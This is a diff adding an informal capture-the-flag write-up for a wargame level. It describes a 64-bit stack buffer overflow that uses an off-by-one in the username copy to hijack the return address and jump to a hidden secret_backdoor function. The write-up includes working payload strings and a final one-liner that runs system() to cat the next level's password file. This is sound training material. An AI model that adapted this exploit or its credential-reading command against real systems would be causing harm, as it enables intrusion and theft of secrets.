@@ -1,0 +1,37 @@
+by doing an objdump, we see a secret_backdoor function that is never called, and it calls system, see reverse_engineer.c for whole code
+after reverse engineering it, we see it calls system with our input, so the goal is probably to call this function
+
+after reverse engineering, we can see that when we input username, it gets copied but with "<=" instead of "<" , that means at index 40, we can set the size for the set_msg strncpy (which uses arg[180] as arg, so thats the 41 character we input)
+We tried it by inputing "A"*41 as username, and put a breakpoint on the strncpy, we can see that the third argument (size), is 0x41 ("A" in hexa)
+
+So that's probably the breach we need to exploit in order to exec secret_backdoor
+we see that the copied buffer is 1024, but buffer is at most 192 (0xc0)
+we couldn't deduce direct size, but we know that buffer is located at ESP in handle_msg, and that stack frame size in this function is 0xc0, so by writing 0xc0 (192), we should reach EIP save
+
+we printf 128-41 X after our input so that fgets stops (inputing "\n" doesn't stop it)
+so we should input "A"*40 + "\xc0" + "X"*(128-41) + "B"*192
+
+This should reach EIP save, let's try it in gdb
+first, we can see that strncpy argument is 192, so this is ok, in our buffer it's almost right
+we have 1 X overflowing from prev buffer, so just put 128-42 X instead of 128-41
+
+"A"*40 + "\xc0" + "X"*(128-42) + "B"*192
+now in buf we have 'B' <reapeaet 192 times> so it's ok
+let's continue to handle_msg ret, now wee see that we still don't reach EIP save, almost but we need 0x7fffffffe5c8 (EIP save addr) - 0x7fffffffe5c0 ("B"*192 end addr) = 8
+more B's, so now try with:
+"A"*40 + "\xc8" + "X"*(128-42) + "B"*200
+
+And we see that we reach the beggining of EIP save :D, so we should just add 8 more bytes and that should be the new EIP (since it's 64 bits we need 8 and not 4 like before)
+so try with
+"A"*40 + "\xd0" + "X"*(128-42) + "B"*200 + "\x01\x01\x02\x02" + "\xff"*4
+since it's little endian, as before, we need to print the address in reverse order, but since it's 8 bytes now, we need to print last 4 bytes (still in reverse order) and then the first 4 bytes (still in reverse order), so just in reverse order, that's the advantage of little endian, we can just print the address in reverse order and it's ok
+
+secret_backdoor addreess is 0x00 00 55 55 55 55 48 8c, so in little endian it's
+"\x8c\x48\x55\x55\x55\x55\x00\x00", so we should print
+"A"*40 + "\xd0" + "X"*(128-42) + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"
+and in gdb we get into the function, but segfault, and of course !, secret_backdoor does a fgeets, but since we didn't input anything with our script it calls systeme with nothing, then returns and segfault because of the overflow, so we just need to input something to secret_backdoor, first we need to fill the 1024 buffer for msg, so :
+"A"*40 + "\xd0" + "X"*(128-42) + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "X"*(1024-(200+8+1)) + "/bin/sh" + "\x00"
+we need the \0 after /bin/sh otherwise it calls system("/bin/sh\n")
+so now it should work. well it doesn't and closes ssh connection, but that probably cause we try to open a shell, so let's just do a "/bin/cat /home/users/end/.pass", so:
+./level09 < <(python -c 'print "A"*40 + "\xd0" + "X"*(128-42) + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "X"*(1024-(200+8+1)) + "/bin/cat /home/users/end/.pass" + "\x00"')
+and it works :D, gg everyone
